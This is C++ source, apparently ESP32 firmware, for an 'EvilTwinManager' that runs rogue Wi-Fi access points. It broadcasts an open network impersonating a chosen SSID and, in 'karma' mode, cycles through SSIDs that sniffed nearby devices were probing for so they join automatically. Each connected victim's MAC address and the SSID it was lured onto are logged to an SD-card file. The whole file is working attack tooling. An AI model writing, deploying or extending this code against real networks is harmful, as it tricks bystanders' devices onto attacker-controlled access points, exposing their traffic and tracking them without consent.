#include "EvilTwinManager.h"
#include "../storage/SdCard.h"
#include "BeaconProbeSniffer.h"
#include <WiFi.h>
#include <esp_wifi.h>

EvilTwinManager g_evilTwinManager;

void EvilTwinManager::begin(QueueHandle_t outQueue) {
    _mutex = xSemaphoreCreateMutex();
    _outQueue = outQueue;
}

size_t EvilTwinManager::previewKarmaCandidates(std::vector<String>& out) const {
    out.clear();
    size_t clientCount = g_beaconProbeSniffer.clientCount();
    BeaconProbeSniffer::ProbeClient c;
    for (size_t i = 0; i < clientCount && out.size() < kMaxKarmaCandidates; i++) {
        if (!g_beaconProbeSniffer.getClient(i, c)) continue;
        for (const auto& probed : c.probedSsids) {
            if (out.size() >= kMaxKarmaCandidates) break;
            bool dup = false;
            for (const auto& existing : out) {
                if (existing == probed) {
                    dup = true;
                    break;
                }
            }
            if (!dup) out.push_back(probed);
        }
    }
    return out.size();
}

bool EvilTwinManager::startKarma(uint8_t channel) {
    if (_running) return false;

    std::vector<String> candidates;
    if (previewKarmaCandidates(candidates) == 0) return false;  // nothing to impersonate - run BEACON/PROBE INTEL first

    _karmaMode = true;
    _karmaCandidates = candidates;
    _karmaIndex = 0;
    _ssid = _karmaCandidates[0];
    _channel = channel;

    if (xSemaphoreTake(_mutex, pdMS_TO_TICKS(200)) == pdTRUE) {
        _associations.clear();
        _seenMacs.clear();
        xSemaphoreGive(_mutex);
    }

    // WIFI_AP_STA - same channel-sharing caveat as start() below.
    WiFi.mode(WIFI_AP_STA);
    bool ok = WiFi.softAP(_ssid.c_str(), /*password=*/nullptr, channel);
    if (!ok) {
        WiFi.mode(WIFI_STA);
        _karmaMode = false;
        return false;
    }

    _running = true;
    notify("karma AP up: cycling " + String(_karmaCandidates.size()) + " candidate SSID(s), starting \"" + _ssid +
           "\"");
    xTaskCreatePinnedToCore(&EvilTwinManager::taskEntry, "eviltwin", 4096, this, 1, nullptr, 0);
    return true;
}

void EvilTwinManager::advanceKarmaCandidate() {
    if (_karmaCandidates.empty()) return;
    _karmaIndex = (_karmaIndex + 1) % _karmaCandidates.size();
    _ssid = _karmaCandidates[_karmaIndex];

    WiFi.softAPdisconnect(true);
    WiFi.softAP(_ssid.c_str(), /*password=*/nullptr, _channel);
    notify("karma: now broadcasting \"" + _ssid + "\" (" + String((unsigned)(_karmaIndex + 1)) + "/" +
           String((unsigned)_karmaCandidates.size()) + ")");
}

bool EvilTwinManager::start(const String& ssid, uint8_t channel) {
    if (_running || ssid.isEmpty()) return false;

    _ssid = ssid;
    _channel = channel;
    _karmaMode = false;
    if (xSemaphoreTake(_mutex, pdMS_TO_TICKS(200)) == pdTRUE) {
        _associations.clear();
        _seenMacs.clear();
        xSemaphoreGive(_mutex);
    }

    // WIFI_AP_STA (not WIFI_AP) so an existing STA connection to the
    // user's own network survives — see the class comment on the
    // channel constraint this shared-radio mode implies.
    WiFi.mode(WIFI_AP_STA);
    bool ok = WiFi.softAP(_ssid.c_str(), /*password=*/nullptr, channel);
    if (!ok) {
        WiFi.mode(WIFI_STA);
        return false;
    }

    _running = true;
    notify("evil twin AP up: \"" + _ssid + "\"");
    xTaskCreatePinnedToCore(&EvilTwinManager::taskEntry, "eviltwin", 4096, this, 1, nullptr, 0);
    return true;
}

void EvilTwinManager::stop() {
    _running = false;  // run() notices and tears the AP down before exiting
}

void EvilTwinManager::taskEntry(void* arg) {
    static_cast<EvilTwinManager*>(arg)->run();
    vTaskDelete(nullptr);
}

void EvilTwinManager::run() {
    uint32_t lastKarmaSwitchMs = millis();
    while (_running) {
        if (_karmaMode && (millis() - lastKarmaSwitchMs) >= kKarmaDwellMs) {
            advanceKarmaCandidate();
            lastKarmaSwitchMs = millis();
        }

        wifi_sta_list_t list;
        if (esp_wifi_ap_get_sta_list(&list) == ESP_OK) {
            for (int i = 0; i < list.num; i++) {
                char buf[18];
                snprintf(buf, sizeof(buf), "%02x:%02x:%02x:%02x:%02x:%02x", list.sta[i].mac[0],
                         list.sta[i].mac[1], list.sta[i].mac[2], list.sta[i].mac[3], list.sta[i].mac[4],
                         list.sta[i].mac[5]);
                String mac(buf);

                bool alreadySeen = false;
                if (xSemaphoreTake(_mutex, pdMS_TO_TICKS(200)) == pdTRUE) {
                    for (const auto& seen : _seenMacs) {
                        if (seen == mac) {
                            alreadySeen = true;
                            break;
                        }
                    }
                    if (!alreadySeen) _seenMacs.push_back(mac);
                    xSemaphoreGive(_mutex);
                }
                if (!alreadySeen) logAssociation(mac);
            }
        }
        vTaskDelay(pdMS_TO_TICKS(1000));
    }

    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_STA);
    notify(_karmaMode ? "karma AP stopped" : "evil twin AP stopped");
}

void EvilTwinManager::logAssociation(const String& mac) {
    Association a;
    a.mac = mac;
    a.ssid = _ssid;  // whichever SSID is currently broadcasting - the one this client was fooled into joining
    a.atMs = millis();

    if (xSemaphoreTake(_mutex, pdMS_TO_TICKS(200)) == pdTRUE) {
        _associations.push_back(a);
        xSemaphoreGive(_mutex);
    }

    fs::FS& fs = sdcard::exportFs();
    fs.mkdir("/eviltwin");
    File f = fs.open("/eviltwin/associations.csv", "a");
    if (f) {
        f.println(_ssid + "," + mac + "," + String(millis() / 1000));
        f.close();
    }

    notify(_karmaMode ? ("client connected: " + mac + " -> \"" + _ssid + "\"") : ("client connected: " + mac));
}

void EvilTwinManager::notify(const String& text) {
    if (!_outQueue) return;
    ScanNotification n;
    n.source = ScanSource::EvilTwin;
    n.type = ScanEventType::LogLine;
    n.setText(text.c_str());
    xQueueSend(_outQueue, &n, 0);
}

size_t EvilTwinManager::associationCount() const {
    if (!_mutex || xSemaphoreTake(_mutex, pdMS_TO_TICKS(100)) != pdTRUE) return 0;
    size_t n = _associations.size();
    xSemaphoreGive(_mutex);
    return n;
}

bool EvilTwinManager::getAssociation(size_t index, Association& out) const {
    if (!_mutex || xSemaphoreTake(_mutex, pdMS_TO_TICKS(100)) != pdTRUE) return false;
    bool ok = index < _associations.size();
    if (ok) out = _associations[_associations.size() - 1 - index];
    xSemaphoreGive(_mutex);
    return ok;
}
